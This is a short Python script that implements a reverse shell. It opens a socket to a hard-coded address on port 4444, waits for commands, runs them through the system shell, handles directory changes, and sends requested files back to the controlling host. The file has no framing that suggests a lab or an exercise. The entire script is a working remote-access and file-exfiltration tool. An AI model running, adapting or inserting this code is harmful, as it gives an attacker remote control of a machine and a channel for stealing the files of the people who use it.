import socket
import subprocess
import os

#
IP = '192.168.1.5'
PORT = 4444
PREFIX = 'ISO-8859-1'       #utf-8
WIN_PREFIX = "windows-1252"

#
payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
payload.connect((IP, PORT))
print("Connected")

#
def send_data(output_data):
	size_of_data = len(output_data)
	size_of_data = str(size_of_data)
	payload.send(bytes(size_of_data, PREFIX))
	payload.send(output_data)
	
#
while True:
    cmd = payload.recv(2048) # receive command
    cmd = cmd.decode(PREFIX) # decode to string
    
    if cmd == 'quit':# check if command is quit
        payload.close()
        break

    # Handle changing directories
    elif cmd[:2] == 'cd':
        # Move threw directories
        try:
                os.chdir(cmd[3:])
        except FileNotFoundError:
                send_data(b"Folder does not exist.")
        else:
                send_data(b"Changed directory")
        continue
        
    # Download a file : download <cmd_input>
    elif cmd[:8] == 'download':
        try:
            with open(f'{cmd[9:]}', 'rb') as data:
                data_read = data.read()
                data.close()
        except FileNotFoundError:
            send_data(b"File does not exist.")
        else:
            send_data(data_read)
        continue
       
    try:
        output = subprocess.check_output(cmd, shell=True)
    except subprocess.CalledProcessError:
        send_data(b"Wrong Command")
    else:
        send_data(output)
